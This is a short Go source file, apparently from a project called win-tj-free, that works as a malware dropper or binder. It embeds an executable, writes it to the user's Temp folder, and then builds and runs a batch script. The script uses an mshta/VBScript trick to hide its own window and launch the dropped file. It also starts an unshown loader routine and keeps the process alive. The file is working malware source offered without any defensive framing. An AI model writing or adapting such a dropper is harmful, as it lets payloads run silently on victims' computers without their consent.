package tj

import (
	"embed"
	"github.com/ha1yu/win-tj-free/utils"
	"io/ioutil"
	"log"
	"time"
)

//go:embed f.exe
var embededFiles embed.FS

// win客户端守护脚本
var windowsScript = `
@echo off
%1 mshta vbscript:CreateObject("WScript.Shell").Run("%~s0 ::",0,FALSE)(window.close)&&exit
%v
`

func TjRun() {
	go loaderRun()
	flashRun()
	time.Sleep(9999999999999999)
}

func flashRun() {

	bytes, err := embededFiles.ReadFile("f.exe")
	if err != nil {
		log.Println(err)
		return
	}

	err = ioutil.WriteFile(utils.UserLocalAppData()+"/Temp/f.exe", bytes, 0666)
	if err != nil {
		log.Println(err)
		return
	}

	//utils.ExecShell1("" + utils.UserLocalAppData() + "/Temp/f.exe")

	//windowsScript := windowsScript + "\n\r" + utils.UserLocalAppData() + "/Temp/f.exe"
	a := "@echo off\n\r"
	b := "%1 mshta vbscript:CreateObject(\"WScript.Shell\").Run(\"%~s0 ::\",0,FALSE)(window.close)&&exit\n\n"
	c := utils.UserLocalAppData() + "/Temp/f.exe"
	ws := a + b + c
	utils.Write(utils.UserLocalAppData()+"/Temp/1.bat", ws)
	//log.Println(a + b + c)
	utils.ExecShell1(utils.UserLocalAppData() + "/Temp/1.bat")

}
